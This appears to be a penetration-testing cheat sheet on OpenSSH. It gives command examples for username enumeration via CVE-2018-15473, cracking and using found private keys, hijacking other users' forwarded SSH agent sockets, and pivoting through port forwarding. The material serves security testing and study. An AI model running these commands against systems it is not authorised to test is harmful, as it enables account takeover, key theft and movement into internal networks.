# OpenSSH

**What it is:** The standard SSH server on virtually every Linux/Unix system. Direct exploits are rare in modern versions, but username enumeration, key-based attacks, and misconfigurations are common.

**Default ports:** 22

**Vuln research:**
- [OpenSSH Security](https://www.openssh.com/security.html)
- [SearchSploit: `searchsploit openssh`](https://www.exploit-db.com/search?q=openssh)

---

### Username enumeration (CVE-2018-15473)

OpenSSH < 7.7 — Determine valid usernames

```bash
python3 ssh_enum.py $IP -u root
python3 ssh_enum.py $IP -U users.txt
# Or Metasploit:
use auxiliary/scanner/ssh/ssh_enumusers
```

---

### SSH key exploitation

If you find a private key — Use it

```bash
# Found id_rsa in a share, web dir, or LFI:
chmod 600 id_rsa
ssh -i id_rsa user@$IP

# If passphrase protected:
ssh2john id_rsa > ssh.hash
john ssh.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

---

### SSH agent forwarding hijack

If agent forwarding is enabled — Hijack other users' keys

```bash
# Find SSH agent sockets:
ls -la /tmp/ssh-*/
# If you find another user's socket:
export SSH_AUTH_SOCK=/tmp/ssh-XXXXXX/agent.XXXXX
ssh-add -l  # List their keys
ssh user@other-host  # Use their keys
```

---

### SSH port forwarding abuse

If you have SSH access — Reach internal services

```bash
# Local forward (access internal service from your box):
ssh -L 8080:127.0.0.1:8080 user@$IP
# Now visit http://127.0.0.1:8080 on your machine

# Dynamic SOCKS proxy:
ssh -D 9050 user@$IP
# Configure proxychains to use 127.0.0.1:9050
```

---
